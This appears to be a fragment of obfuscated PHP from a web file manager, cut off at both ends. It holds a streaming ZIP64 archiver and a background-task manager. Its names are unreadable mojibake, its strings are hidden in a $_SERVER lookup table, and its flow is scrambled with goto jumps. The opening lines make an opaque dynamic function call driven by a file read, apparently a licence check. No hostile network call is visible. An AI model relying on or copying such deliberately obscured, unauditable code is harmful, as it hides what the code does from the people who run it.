$cèÙ∞•∫πÒ); } } goto F∂óêÿº∏Í; F≠Ù‰¥∑Õ‘: if ($_SERVER[$_SERVER[∞„˜ƒÑºª][51]] != $_SERVER[$_SERVER[∞„˜ƒÑºª][52]]) { goto aôªÕ⁄‹∆∂; AÛÈﬁﬁúöë: $dúø£ç“Ωê = explode($_SERVER[∞„˜ƒÑºª][55], $Eíö¯‹÷èã); if (count($dúø£ç“Ωê) < $_SERVER[∞„˜ƒÑºª][56]) { die; } $Dœ‹◊π¢È¥ = $_SERVER[∞„˜ƒÑºª][57]; goto aù¢Ù‰È∆ﬂ; aù¢Ù‰È∆ﬂ: $Dœ‹◊π¢È¥($_SERVER[$_SERVER[∞„˜ƒÑºª][58]]); goto Dª∆ÛÍı›Æ; aôªÕ⁄‹∆∂: $D¬Âàà‹∑í = $_SERVER[∞„˜ƒÑºª][53]; $Fπ˜ÜŸ∞ôô = BASIC_PATH . $_SERVER[∞„˜ƒÑºª][54]; $Eíö¯‹÷èã = $D¬Âàà‹∑í($Fπ˜ÜŸ∞ôô); goto AÛÈﬁﬁúöë; Dª∆ÛÍı›Æ: } class ZipMake { const VERSION = "\60\x2e\62\56\x30"; const ZIP_VERSION = 10; const ZIP_VERSION_64 = 45; const METHOD_STORE = 0; const FILE_HEADER_SIGNATURE = 67324752; const CDR_FILE_SIGNATURE = 33639248; const CDR_EOF_SIGNATURE = 101010256; const DATA_DESCRIPTOR_SIGNATURE = 134695760; const ZIP64_CDR_EOF_SIGNATURE = 101075792; const ZIP64_CDR_LOCATOR_SIGNATURE = 117853008; public $files = array(); public $cdrOffset = 0; public $ofs = 0; protected $needHeaders; protected $outputName; public function __construct($B„µ‹âƒÙ± = null) { $D∑ åãÂá› =& $_SERVER[∞„˜ƒÑºª]; $this->outputStream = fopen($D∑ åãÂá›[1387], $D∑ åãÂá›[934]); $this->outputName = $B„µ‹âƒÙ±; $this->needHeaders = !0; } public function addFile($F–Ø≤√±óΩ, $BÌ›ˆºéÀ) { goto dñ⁄‘àñ¯’; fêøñﬂá™Ã: $this->addFileFooter($F–Ø≤√±óΩ, $d‹–∆ÿûô«, $b±âı£¨ŸÉ, $b⁄æïåË≠î, $E„©∫äÕ™¥, $cßë•Ç‰é¿); goto fèÑÏâÓ¶Â; C‘ÍÈ§´Éñ: while (!feof($bÃù»Èï∫Õ)) { $dŸ•ä¥ª∫Ï = fread($bÃù»Èï∫Õ, 1048576); $this->send($dŸ•ä¥ª∫Ï); } fclose($bÃù»Èï∫Õ); $b±âı£¨ŸÉ = hexdec(hash_file($A‚ª◊Ü†å[1389], $BÌ›ˆºéÀ)); goto fêøñﬂá™Ã; dñ⁄‘àñ¯’: $A‚ª◊Ü†å =& $_SERVER[∞„˜ƒÑºª]; $F–Ø≤√±óΩ = $this->filterFilename($F–Ø≤√±óΩ); $d‹–∆ÿûô« = static::METHOD_STORE; goto cß™ÙÆÆ…ì; cß™ÙÆÆ…ì: $cßë•Ç‰é¿ = $this->addFileHeader($F–Ø≤√±óΩ, $d‹–∆ÿûô«); $b⁄æïåË≠î = $E„©∫äÕ™¥ = filesize($BÌ›ˆºéÀ); $bÃù»Èï∫Õ = fopen($BÌ›ˆºéÀ, $A‚ª◊Ü†å[1388]); goto C‘ÍÈ§´Éñ; fèÑÏâÓ¶Â: } public function addFileFromStream($AÏ§∏êí‰‚, $B€ÌˆÖ∫Òò) { goto b»ÏËº©ÑÀ; b»ÏËº©ÑÀ: $AÏ§∏êí‰‚ = $this->filterFilename($AÏ§∏êí‰‚); $B•éÒóÀâê = static::METHOD_STORE; $eÿÁàçÏ¯¯ = $this->addFileHeader($AÏ§∏êí‰‚, $B•éÒóÀâê); goto f‰º—‡Ù´—; CΩˆô√ú¡Ì: $this->addFileFooter($AÏ§∏êí‰‚, $B•éÒóÀâê, $bÖÑ¿Øô¨√, $A¥äÑÃÖËÁ, $Aÿ¢¿Â›õ˘, $eÿÁàçÏ¯¯); goto e∞ÔÓïò˜π; f‰º—‡Ù´—: fseek($B€ÌˆÖ∫Òò, 0, SEEK_END); $A¥äÑÃÖËÁ = $Aÿ¢¿Â›õ˘ = ftell($B€ÌˆÖ∫Òò); rewind($B€ÌˆÖ∫Òò); goto Füå‹ﬁ∆ûé; Füå‹ﬁ∆ûé: $d∂¥îöóöõ = hash_init($_SERVER[∞„˜ƒÑºª][1389]); while (!feof($B€ÌˆÖ∫Òò)) { $bÌàÍëÛÙó = fread($B€ÌˆÖ∫Òò, 1048576); hash_update($d∂¥îöóöõ, $bÌàÍëÛÙó); $this->send($bÌàÍëÛÙó); } $bÖÑ¿Øô¨√ = hexdec(hash_final($d∂¥îöóöõ)); goto CΩˆô√ú¡Ì; e∞ÔÓïò˜π: } public function finish() { foreach ($this->files as $EÒ™©˜¬†¯) { $this->addCdrFile($EÒ™©˜¬†¯); } $this->addCdr64Eof(); $this->addCdr64Locator(); $this->addCdrEof(); $this->clear(); } protected function addFileHeader($dùÜéÿ±≤√, $dêê™õ≤õà) { goto c‰„úÒŸÂ±; e—ú¬Û´Ã†: return strlen($c§çº€∫∏§) + $AéÓ∞≥’ı® + strlen($Bà≤∏°ÿ∂ƒ); goto aïÖéÿìŒ…; bËá”Ö¥õá: $c§çº€∫∏§ = $this->packFields($eï€ë§á’Ç); $Bà≤∏°ÿ∂ƒ = $this->packFields($d“ÑŒ¿ΩùÕ); $this->send($c§çº€∫∏§ . $dùÜéÿ±≤√ . $Bà≤∏°ÿ∂ƒ); goto e—ú¬Û´Ã†; a’Á´◊ßÎã: $FÊ˘ıòâ≤å = $this->dosTime(time()); $eï€ë§á’Ç = array(array($Fñ’ºè›È”[1391], static::FILE_HEADER_SIGNATURE), array($Fñ’ºè›È”[1392], static::ZIP_VERSION_64), array($Fñ’ºè›È”[1392], 8), array($Fñ’ºè›È”[1392], $dêê™õ≤õà), array($Fñ’ºè›È”[1391], $FÊ˘ıòâ≤å), array($Fñ’ºè›È”[1391], 0), array($Fñ’ºè›È”[1391], 4294967295), array($Fñ’ºè›È”[1391], 4294967295), array($Fñ’ºè›È”[1392], $AéÓ∞≥’ı®), array($Fñ’ºè›È”[1392], 32)); $d“ÑŒ¿ΩùÕ = array(array($Fñ’ºè›È”[1392], 1), array($Fñ’ºè›È”[1392], 28), array($Fñ’ºè›È”[1393], 0), array($Fñ’ºè›È”[1393], 0), array($Fñ’ºè›È”[1393], 0), array($Fñ’ºè›È”[1391], 0)); goto bËá”Ö¥õá; c‰„úÒŸÂ±: $Fñ’ºè›È” =& $_SERVER[∞„˜ƒÑºª]; $dùÜéÿ±≤√ = preg_replace($Fñ’ºè›È”[1390], $Fñ’ºè›È”[33], $dùÜéÿ±≤√); $AéÓ∞≥’ı® = strlen($dùÜéÿ±≤√); goto a’Á´◊ßÎã; aïÖéÿìŒ…: } protected function addFileFooter($eÇ≤èüÑàç, $C—ê–ÁΩÉ™, $b¶îÜ‚√º◊, $DÙößœïäÇ, $BçØ∫ÉΩË , $B€ ñ∞øÑ≥) { $dÂπﬂª¶˘ú =& $_SERVER[∞„˜ƒÑºª]; $fÚ»¶∞ø≈¶ = array(array($dÂπﬂª¶˘ú[1391], static::DATA_DESCRIPTOR_SIGNATURE), array($dÂπﬂª¶˘ú[1391], $b¶îÜ‚√º◊), array($dÂπﬂª¶˘ú[1393], $DÙößœïäÇ), array($dÂπﬂª¶˘ú[1393], $BçØ∫ÉΩË )); $b¿‹ÈÚîõ⁄ = $this->packFields($fÚ»¶∞ø≈¶); $this->send($b¿‹ÈÚîõ⁄); $eà¢∆Ö‰ãÉ = $B€ ñ∞øÑ≥ + $DÙößœïäÇ + $Döüº∏ÆÑ…; $this->addToCdr($eÇ≤èüÑàç, $C—ê–ÁΩÉ™, $b¶îÜ‚√º◊, $DÙößœïäÇ, $BçØ∫ÉΩË , $eà¢∆Ö‰ãÉ); } private function addToCdr($A„õ¥∆ÂØı, $BÁ∫‡∫À‘∏, $D∞‡‘·Æí®, $A˘ƒÈÉè≠®, $aíåæ◊¯û“, $b–ﬁ£é´Øﬁ) { $this->files[] = array($A„õ¥∆ÂØı, $BÁ∫‡∫À‘∏, $D∞‡‘·Æí®, $A˘ƒÈÉè≠®, $aíåæ◊¯û“, $this->ofs); $this->ofs += $b–ﬁ£é´Øﬁ; } protected function addCdrFile($b∫œÁœ”≥Û) { goto cÀ‚ñ‚Âæ∏; cÀ‚ñ‚Âæ∏: $C™Ÿ≠¡Üñ≈ =& $_SERVER[∞„˜ƒÑºª]; list($bäò‘¡ µ, $F‰í∞É¯∞æ, $f®ú⁄≤Á”…, $fœÊâ≈î≈Ô, $FßˆäÉ≠Ö¿, $cˆ÷ê≥äΩÈ) = $b∫œÁœ”≥Û; $BÒËÍá¨Ÿ‡ = $C™Ÿ≠¡Üñ≈[33]; goto a—Ò¿ïã˘ü; Eöî≤ÓåµÓ: $this->send($dæœàÙâØÕ); $this->cdr_ofs += strlen($dæœàÙâØÕ); goto eÎç–Á◊å…; B¬Æ¶›¥–: $aùáÿ¯Ÿç = $this->packFields($e î∏µâ÷í); $d∑Ó∆‡…±∆ = $this->packFields($D· ì‚◊Ô÷); $dæœàÙâØÕ = $aùáÿ¯Ÿç . $bäò‘¡ µ . $BÒËÍá¨Ÿ‡ . $d∑Ó∆‡…±∆; goto Eöî≤ÓåµÓ; a—Ò¿ïã˘ü: $c£æëûû‹‰ = $this->dosTime(time()); $e î∏µâ÷í = array(array($C™Ÿ≠¡Üñ≈[1391], static::CDR_FILE_SIGNATURE), array($C™Ÿ≠¡Üñ≈[1392], static::ZIP_VERSION_64), array($C™Ÿ≠¡Üñ≈[1392], static::ZIP_VERSION_64), array($C™Ÿ≠¡Üñ≈[1392], 8), array($C™Ÿ≠¡Üñ≈[1392], $F‰í∞É¯∞æ), array($C™Ÿ≠¡Üñ≈[1391], $c£æëûû‹‰), array($C™Ÿ≠¡Üñ≈[1391], $f®ú⁄≤Á”…), array($C™Ÿ≠¡Üñ≈[1391], 4294967295), array($C™Ÿ≠¡Üñ≈[1391], 4294967295), array($C™Ÿ≠¡Üñ≈[1392], strlen($bäò‘¡ µ)), array($C™Ÿ≠¡Üñ≈[1392], 32), array($C™Ÿ≠¡Üñ≈[1392], strlen($BÒËÍá¨Ÿ‡)), array($C™Ÿ≠¡Üñ≈[1392], 0), array($C™Ÿ≠¡Üñ≈[1392], 0), array($C™Ÿ≠¡Üñ≈[1391], 32), array($C™Ÿ≠¡Üñ≈[1391], 4294967295)); $D· ì‚◊Ô÷ = array(array($C™Ÿ≠¡Üñ≈[1392], 1), array($C™Ÿ≠¡Üñ≈[1392], 28), array($C™Ÿ≠¡Üñ≈[1393], $FßˆäÉ≠Ö¿), array($C™Ÿ≠¡Üñ≈[1393], $fœÊâ≈î≈Ô), array($C™Ÿ≠¡Üñ≈[1393], $cˆ÷ê≥äΩÈ), array($C™Ÿ≠¡Üñ≈[1391], 0)); goto B¬Æ¶›¥–; eÎç–Á◊å…: } protected function addCdr64Eof() { goto eïôÔ®”±≤; C…ñÁ©áŒı: $this->send($EòÒÎÿØŸ ); goto E≥ü–√„⁄à; eïôÔ®”±≤: $a∞”Ûæä±ç =& $_SERVER[∞„˜ƒÑºª]; $Dâ†≤¡Œû¬ = count($this->files); $d’¬∆ü‡ﬁ‡ = $this->cdr_ofs; goto cõù¨¨¢Û¬; cõù¨¨¢Û¬: $CÃÓ±∞π¨õ = $this->ofs; $a ú•û›»± = array(array($a∞”Ûæä±ç[1391], static::ZIP64_CDR_EOF_SIGNATURE), array($a∞”Ûæä±ç[1393], 44), array($a∞”Ûæä±ç[1392], static::ZIP_VERSION_64), array($a∞”Ûæä±ç[1392], static::ZIP_VERSION_64), array($a∞”Ûæä±ç[1391], 0), array($a∞”Ûæä±ç[1391], 0), array($a∞”Ûæä±ç[1393], $Dâ†≤¡Œû¬), array($a∞”Ûæä±ç[1393], $Dâ†≤¡Œû¬), array($a∞”Ûæä±ç[1393], $d’¬∆ü‡ﬁ‡), array($a∞”Ûæä±ç[1393], $CÃÓ±∞π¨õ)); $EòÒÎÿØŸ  = $this->packFields($a ú•û›»±); goto C…ñÁ©áŒı; E≥ü–√„⁄à: } protected function addCdr64Locator() { goto CËÊêÙì”≥; Fÿ ´Ú◊™È: $eÙÙà≈¿ã© = $this->ofs; $b¥ôåﬁ‘ ÿ = array(array($D·‚à‡Îßä[1391], static::ZIP64_CDR_LOCATOR_SIGNATURE), array($D·‚à‡Îßä[1391], 0), array($D·‚à‡Îßä[1393], $eÙÙà≈¿ã© + $A±ñﬂΩ§πá), array($D·‚à‡Îßä[1391], 1)); $bé«˜ÚàúÀ = $this->packFields($b¥ôåﬁ‘ ÿ); goto fëÌÍ¬Öùπ; fëÌÍ¬Öùπ: $this->send($bé«˜ÚàúÀ); goto dÂá ¶Ôâú; CËÊêÙì”≥: $D·‚à‡Îßä =& $_SERVER[∞„˜ƒÑºª]; $däçë•–ÿ· = count($this->files); $A±ñﬂΩ§πá = $this->cdr_ofs; goto Fÿ ´Ú◊™È; dÂá ¶Ôâú: } protected function addCdrEof() { goto CÔ©Üè÷†î; A©¡ÿôŒù·: $Eöæ˘Øç‡≤ = $this->packFields($a¡÷≠œ®¶˘) . $DûñîèÀÃÉ; $this->send($Eöæ˘Øç‡≤); goto e∫™˘Üì≥Ô; F‚Ò„®≠˘ò: $B∏…◊ºì–œ = $this->ofs; $DûñîèÀÃÉ = $cÉå°’†ã®[33]; $a¡÷≠œ®¶˘ = array(array($cÉå°’†ã®[1391], static::CDR_EOF_SIGNATURE), array($cÉå°’†ã®[1392], 0), array($cÉå°’†ã®[1392], 0), array($cÉå°’†ã®[1392], $b≠´úÎÆç¯), array($cÉå°’†ã®[1392], $b≠´úÎÆç¯), array($cÉå°’†ã®[1391], 4294967295), array($cÉå°’†ã®[1391], 4294967295), array($cÉå°’†ã®[1392], strlen($DûñîèÀÃÉ))); goto A©¡ÿôŒù·; CÔ©Üè÷†î: $cÉå°’†ã® =& $_SERVER[∞„˜ƒÑºª]; $b≠´úÎÆç¯ = count($this->files); $Aıã”áÕÈà = $this->cdr_ofs; goto F‚Ò„®≠˘ò; e∫™˘Üì≥Ô: } protected function addCdr() { foreach ($this->files as $Fç¿µ–´Âç) { $this->addCdrFile($Fç¿µ–´Âç); } $this->addCdrEof(); } protected function clear() { $this->files = array(); $this->ofs = 0; $this->cdr_ofs = 0; } protected function sendHttpHeaders() { $FàπŸ…µ©“ =& $_SERVER[∞„˜ƒÑºª]; $dŸïàË¢èÊ = $FàπŸ…µ©“[198]; if ($this->outputName) { $Fß¶Ô™óÉ° = trim(str_replace(array($FàπŸ…µ©“[110], $FàπŸ…µ©“[63], $FàπŸ…µ©“[100], $FàπŸ…µ©“[76], $FàπŸ…µ©“[55], $FàπŸ…µ©“[485]), $FàπŸ…µ©“[33], $this->outputName)); $a∂©©∂Ù≤¿ = rawurlencode($Fß¶Ô™óÉ°); $dŸïàË¢èÊ .= "\x3b\x20\146\x69\x6c\x65\156\141\x6d\x65\x2a\x3d\x75\x74\146\55\x38\x27\47{$a∂©©∂Ù≤¿}"; } $aø±«ÖÿãÖ = array($FàπŸ…µ©“[195] => $FàπŸ…µ©“[1394], $FàπŸ…µ©“[1395] => $dŸïàË¢èÊ, $FàπŸ…µ©“[1396] => $FàπŸ…µ©“[1397], $FàπŸ…µ©“[1398] => $FàπŸ…µ©“[1399], $FàπŸ…µ©“[1400] => $FàπŸ…µ©“[1401]); foreach ($aø±«ÖÿãÖ as $EÜÖ∞«ôŸî => $A¿û”¥•®≈) { header($EÜÖ∞«ôŸî . $FàπŸ…µ©“[640] . $A¿û”¥•®≈); } } protected function send($AùÓ‹”ñ€È) { if ($this->needHeaders) { $this->sendHttpHeaders(); } $this->needHeaders = !1; fwrite($this->outputStream, $AùÓ‹”ñ€È); } protected final function dosTime($c∫Ω‡êËÏÊ) { $aŒ∞ÚÁ–‹∏ =& $_SERVER[∞„˜ƒÑºª]; $füõ∞÷êÜÕ = getdate($c∫Ω‡êËÏÊ); if ($füõ∞÷êÜÕ[$aŒ∞ÚÁ–‹∏[1402]] < 1980) { $füõ∞÷êÜÕ = array($aŒ∞ÚÁ–‹∏[1402] => 1980, $aŒ∞ÚÁ–‹∏[1403] => 1, $aŒ∞ÚÁ–‹∏[1404] => 1, $aŒ∞ÚÁ–‹∏[1405] => 0, $aŒ∞ÚÁ–‹∏[1406] => 0, $aŒ∞ÚÁ–‹∏[1407] => 0); } $füõ∞÷êÜÕ[$aŒ∞ÚÁ–‹∏[1402]] -= 1980; return $füõ∞÷êÜÕ[$aŒ∞ÚÁ–‹∏[1402]] << 25 | $füõ∞÷êÜÕ[$aŒ∞ÚÁ–‹∏[1403]] << 21 | $füõ∞÷êÜÕ[$aŒ∞ÚÁ–‹∏[1404]] << 16 | $füõ∞÷êÜÕ[$aŒ∞ÚÁ–‹∏[1405]] << 11 | $füõ∞÷êÜÕ[$aŒ∞ÚÁ–‹∏[1406]] << 5 | $füõ∞÷êÜÕ[$aŒ∞ÚÁ–‹∏[1407]] >> 1; } protected function packFields($däêàƒÀéŒ) { $Bè·°ÜÈ¨™ =& $_SERVER[∞„˜ƒÑºª]; $Bπ‘ÑÂ»îÌ = $Bè·°ÜÈ¨™[33]; $F¬∆ø¥úüü = array(); foreach ($däêàƒÀéŒ as $fÔ®Ø∆Ÿõñ) { $Bπ‘ÑÂ»îÌ .= $fÔ®Ø∆Ÿõñ[0]; $F¬∆ø¥úüü[] = $fÔ®Ø∆Ÿõñ[1]; } array_unshift($F¬∆ø¥úüü, $Bπ‘ÑÂ»îÌ); return call_user_func_array($Bè·°ÜÈ¨™[1408], $F¬∆ø¥úüü); } protected function filterFilename($AÃ®¡Âèêﬂ) { $e˜æ€∆∏Øâ =& $_SERVER[∞„˜ƒÑºª]; return str_replace(array($e˜æ€∆∏Øâ[100], $e˜æ€∆∏Øâ[4], $e˜æ€∆∏Øâ[172], $e˜æ€∆∏Øâ[78], $e˜æ€∆∏Øâ[110], $e˜æ€∆∏Øâ[685], $e˜æ€∆∏Øâ[688], $e˜æ€∆∏Øâ[270]), $e˜æ€∆∏Øâ[79], $AÃ®¡Âèêﬂ); } } class ZipStream { } goto Eè£Ωªäô≈; dÇÃà⁄ÿ´ö: class Task { const STATYS_STOP = "\163\164\x6f\x70"; const STATYS_RUNNING = "\x72\x75\156\x6e\151\156\x67"; const STATYS_KILL = "\x6b\x69\154\x6c"; public $task; public function __destruct() { $this->end(); } public function __construct($CåÉªí’°˘, $F°§∑ß≥Òü = '', $bÖãèÂ †¡ = 0, $BÀ∑îáﬁƒÏ = '') { goto dÉÈ∂≥∫ß˘; dÚœ»›Ó≈’: $this->task[$b´Òåäππ≤[1071]] = timeFloat(); self::valueSet($this->task[$b´Òåäππ≤[366]], $this->task); goto C’√ç¡îô∂; cﬂ¢‚†˘Ê¡: Hook::bind($b´Òåäππ≤[1030], array($this, $b´Òåäππ≤[1074])); Hook::bind($b´Òåäππ≤[1075], array($this, $b´Òåäππ≤[1076])); $this->startAfter(); goto dÚœ»›Ó≈’; dÉÈ∂≥∫ß˘: $b´Òåäππ≤ =& $_SERVER[∞„˜ƒÑºª]; if (self::get($CåÉªí’°˘)) { return; } $this->task = array($b´Òåäππ≤[366] => $CåÉªí’°˘, $b´Òåäππ≤[1063] => USER_ID, $b´Òåäππ≤[973] => $BÀ∑îáﬁƒÏ, $b´Òåäππ≤[29] => $F°§∑ß≥Òü, $b´Òåäππ≤[1064] => $b´Òåäππ≤[33], $b´Òåäππ≤[1065] => $bÖãèÂ †¡, $b´Òåäππ≤[1066] => 0, $b´Òåäππ≤[1067] => 0, $b´Òåäππ≤[1068] => 0, $b´Òåäππ≤[1069] => timeFloat(), $b´Òåäππ≤[1070] => 0, $b´Òåäππ≤[1071] => 0, $b´Òåäππ≤[1072] => 0, $b´Òåäππ≤[1073] => 0, $b´Òåäππ≤[445] => $b´Òåäππ≤[1028]); goto cﬂ¢‚†˘Ê¡; C’√ç¡îô∂: } public function end() { goto EÈµ”æúñª; C”ùπã§ Ò: $Dè•œ§»Æ∫ = timeFloat() - $this->task[$FÃ§„”‡¢™[1069]]; self::log($FÃ§„”‡¢™[1077] . $this->task[$FÃ§„”‡¢™[366]] . $FÃ§„”‡¢™[1078] . $Dè•œ§»Æ∫ . $FÃ§„”‡¢™[1079]); Hook::unbind($FÃ§„”‡¢™[1030], array($this, $FÃ§„”‡¢™[1074])); goto c™⁄ä‹Ø¶Û; c™⁄ä‹Ø¶Û: Hook::unbind($FÃ§„”‡¢™[1075], array($this, $FÃ§„”‡¢™[1076])); $this->endAfter(); $this->task = !1; goto cïŸ‚ﬁÏ–Â; EÈµ”æúñª: $FÃ§„”‡¢™ =& $_SERVER[∞„˜ƒÑºª]; if (!$this->task) { return; } if ($this->task[$FÃ§„”‡¢™[1071]]) { self::valueSet($this->task[$FÃ§„”‡¢™[366]], !1); } goto C”ùπã§ Ò; cïŸ‚ﬁÏ–Â: } public function update($fëÊç≈ø‡Û = 0) { goto b¨ºﬁ®∏…‘; EÏãäêááä: $this->updateAfter(); $côæÏ“˜‹Û = 0.2; if (timeFloat() - $E“º‘‹≥º‡[$dœıóôã¥[1071]] < $côæÏ“˜‹Û) { return; } goto d¥√≠í∫Ÿ¢; dÏÕåãﬂπƒ: if ($DÉ·Ú£ø∆ä == self::STATYS_KILL) { $E∞Ü÷∫ÿ§· = array($dœıóôã¥[1080] => LNG($dœıóôã¥[1081]), $dœıóôã¥[762] => !1); Cache::set($dœıóôã¥[1082] . $this->task[$dœıóôã¥[366]], $E∞Ü÷∫ÿ§·, 30); $this->end(); die; } else { if ($DÉ·Ú£ø∆ä == self::STATYS_STOP) { $BÔÏÉ¡‹ì = 2; $då¨Æ˘ŒÑÊ[$dœıóôã¥[1072]] += $BÔÏÉ¡‹ì; self::valueSet($E“º‘‹≥º‡[$dœıóôã¥[366]], $då¨Æ˘ŒÑÊ); sleep($BÔÏÉ¡‹ì); $this->update(); return; } } $E“º‘‹≥º‡[$dœıóôã¥[445]] = $DÉ·Ú£ø∆ä ? $DÉ·Ú£ø∆ä : $E“º‘‹≥º‡[$dœıóôã¥[445]]; $E“º‘‹≥º‡[$dœıóôã¥[1072]] = $då¨Æ˘ŒÑÊ[$dœıóôã¥[1072]] ? $då¨Æ˘ŒÑÊ[$dœıóôã¥[1072]] : 0; goto aﬁ‰°Éî‹Î; BöèáÖ®√ª: $E“º‘‹≥º‡[$dœıóôã¥[1066]] += $fëÊç≈ø‡Û; $E“º‘‹≥º‡[$dœıóôã¥[1070]] = timeFloat(); if ($E“º‘‹≥º‡[$dœıóôã¥[1065]]) { $Cïè∆ﬁìµé = timeFloat() - $E“º‘‹≥º‡[$dœıóôã¥[1069]] - $E“º‘‹≥º‡[$dœıóôã¥[1072]]; $E“º‘‹≥º‡[$dœıóôã¥[1067]] = $E“º‘‹≥º‡[$dœıóôã¥[1066]] / $E“º‘‹≥º‡[$dœıóôã¥[1065]]; $E“º‘‹≥º‡[$dœıóôã¥[1068]] = $E“º‘‹≥º‡[$dœıóôã¥[1066]] / $Cïè∆ﬁìµé; if ($E“º‘‹≥º‡[$dœıóôã¥[1067]] > 0) { $E“º‘‹≥º‡[$dœıóôã¥[1073]] = $Cïè∆ﬁìµé * (1 - $E“º‘‹≥º‡[$dœıóôã¥[1067]]) / $E“º‘‹≥º‡[$dœıóôã¥[1067]]; } } goto EÏãäêááä; d¥√≠í∫Ÿ¢: self::cacheClear(); $då¨Æ˘ŒÑÊ = self::get($E“º‘‹≥º‡[$dœıóôã¥[366]]); $DÉ·Ú£ø∆ä = $då¨Æ˘ŒÑÊ[$dœıóôã¥[445]]; goto dÏÕåãﬂπƒ; b¨ºﬁ®∏…‘: $dœıóôã¥ =& $_SERVER[∞„˜ƒÑºª]; $E“º‘‹≥º‡ =& $this->task; if (!$E“º‘‹≥º‡) { return; } goto BöèáÖ®√ª; aﬁ‰°Éî‹Î: $E“º‘‹≥º‡[$dœıóôã¥[1071]] = timeFloat(); self::valueSet($E“º‘‹≥º‡[$dœıóôã¥[366]], $E“º‘‹≥º‡); goto cÑØ£ó©¢ı; cÑØ£ó©¢ı: } protected function updateAfter() { } protected function startAfter() { } protected function endAfter() { } public function shutdownEvent() { $this->end(); } public function showJson($AﬂÍÕÈ¡Ñ´) { $d·”±€õÊØ =& $_SERVER[∞„˜ƒÑºª]; Cache::set($d·”±€õÊØ[1082] . $this->task[$d·”±€õÊØ[366]], $AﬂÍÕÈ¡Ñ´, 30); return $AﬂÍÕÈ¡Ñ´; } public static function get($EæÆ®Ωç£é) { return self::valueGet($EæÆ®Ωç£é); } public static function listData($dø„—∫á∏ü = false) { $E⁄≠»§»ÙÓ =& $_SERVER[∞„˜ƒÑºª]; $D‹—¢ﬂπÊ¢ = self::valueGet(); if ($dø„—∫á∏ü) { $D‹—¢ﬂπÊ¢ = array_filter_by_field($D‹—¢ﬂπÊ¢, $E⁄≠»§»ÙÓ[1063], $dø„—∫á∏ü); } $D‹—¢ﬂπÊ¢ = array_sort_by($D‹—¢ﬂπÊ¢, $E⁄≠»§»ÙÓ[1069], !0); return $D‹—¢ﬂπÊ¢; } public static function kill($e´⁄·ÉÎ÷Ì) { return self::changeStatus($e´⁄·ÉÎ÷Ì, self::STATYS_KILL); } public static function stop($FàŸí›Ê£¿) { return self::changeStatus($FàŸí›Ê£¿, self::STATYS_STOP); } public static function restart($dÆºπ£‹) { return self::changeStatus($dÆºπ£‹, self::STATYS_RUNNING); } public static function killAll() { $dôããÇ¿í¶ =& $_SERVER[∞„˜ƒÑºª]; $báŒ”œÿä¶ = self::listData(); foreach ($báŒ”œÿä¶ as $DŸºÜá€®¿) { self::kill($DŸºÜá€®¿[$dôããÇ¿í¶[366]]); } sleep(2); foreach ($báŒ”œÿä¶ as $DŸºÜá€®¿) { self::valueSet($DŸºÜá€®¿[$dôããÇ¿í¶[366]], !1); } } private static function changeStatus($f®≤ç¿‘πï, $FÉ⁄ßÆ¥–ö) { goto Aπ‚é„…¬è; aµº∑¬≤∑®: $AÛ„–∑ËæÛ[$f´ãΩáúº¡[445]] = $FÉ⁄ßÆ¥–ö; self::valueSet($f®≤ç¿‘πï, $AÛ„–∑ËæÛ); self::log($f´ãΩáúº¡[1083] . $AÛ„–∑ËæÛ[$f´ãΩáúº¡[366]] . $f´ãΩáúº¡[1084] . $FÉ⁄ßÆ¥–ö); goto D¶ÿÖÆ©âŸ; Aπ‚é„…¬è: $f´ãΩáúº¡ =& $_SERVER[∞„˜ƒÑºª]; $AÛ„–∑ËæÛ = self::valueGet($f®≤ç¿‘πï); if (!$AÛ„–∑ËæÛ) { return !1; } goto aµº∑¬≤∑®; D¶ÿÖÆ©âŸ: return !0; goto d˘ÈÂﬁ∫éŸ; d˘ÈÂﬁ∫éŸ: } public static function valueGet($D¡ç√ìÛ‹ﬂ = false) { $A¯§§äø¿è =& $_SERVER[∞„˜ƒÑºª]; $D√å°¥®Öù = $A¯§§äø¿è[1085]; $F±—¶Ñ‚èÙ = Model($A¯§§äø¿è[1061])->get($D¡ç√ìÛ‹ﬂ, $D√å°¥®Öù); if ($D¡ç√ìÛ‹ﬂ) { $F±—¶Ñ‚èÙ = $F±—¶Ñ‚èÙ ? json_decode($F±—¶Ñ‚èÙ, !0) : !1; } else { $F±—¶Ñ‚èÙ = $F±—¶Ñ‚èÙ ? $F±—¶Ñ‚èÙ : array(); foreach ($F±—¶Ñ‚èÙ as $D⁄äÆá›¡Ø => $fÇ±œ–´Ñ±) { $F±—¶Ñ‚èÙ[$D⁄äÆá›¡Ø] = json_decode($fÇ±œ–´Ñ±, !0); } } return $F±—¶Ñ‚èÙ; } public static function valueSet($eœ•åËèÏ, $bîê£¨Ü¿ç) { goto dﬂàÀê§©Ÿ; E≠ü‚°Íèö: return Model($D‡´¡¬Ÿ√Ê[1061])->set($eœ•åËèÏ, $a≥ÉüãœÑÇ, $cµ´≥é∞‡‘); goto cÑ®¯‰…íÖ; dﬂàÀê§©Ÿ: $D‡´¡¬Ÿ√Ê =& $_SERVER[∞„˜ƒÑºª]; $cµ´≥é∞‡‘ = $D‡´¡¬Ÿ√Ê[1085]; if (!$bîê£¨Ü¿ç) { return Model($D‡´¡¬Ÿ√Ê[1061])->remove($eœ•åËèÏ, $cµ´≥é∞‡‘); } goto E§‰à˘¯êÙ; E§‰à˘¯êÙ: $a≥ÉüãœÑÇ = json_encode($bîê£¨Ü¿ç); if (!$a≥ÉüãœÑÇ) { ob_start(); var_dump($bîê£¨Ü¿ç); $E¶õéóú‘£ = ob_get_clean(); self::log($D‡´¡¬Ÿ√Ê[1086] . json_encode_force($E¶õéóú‘£)); } if (!$eœ•åËèÏ || !$bîê£¨Ü¿ç[$D‡´¡¬Ÿ√Ê[366]]) { return !1; } goto E≠ü‚°Íèö; cÑ®¯‰…íÖ: } public static function cacheClear() { $F»ëô’àÛù =& $_SERVER[∞„˜ƒÑºª]; $CÆππÓëßú = Model($F»ëô’àÛù[1061])->cacheKey($F»ëô’àÛù[1085]); Cache::clearMemory($CÆππÓëßú); } public static function log($a«êΩØ©£‡) { write_log($a«êΩØ©£‡, $_SERVER[∞„˜ƒÑºª][1087]); } } class TaskFileTransfer extends Task { protected function startAfter() { goto Cí˜‹≤∂⁄Ü; dÉﬂÖ¿Üì¬: Hook::bind($Dà≠€ƒÑ´â[1088], array($this, $Dà≠€ƒÑ´â[1089])); Hook::bind($Dà≠€ƒÑ´â[1090], array($this, $Dà≠€ƒÑ´â[1091])); Hook::bind($Dà≠€ƒÑ´â[421], array($this, $Dà≠€ƒÑ´â[1092])); goto cÑÉµÛ£“ó; büÿß≥ø◊ô: 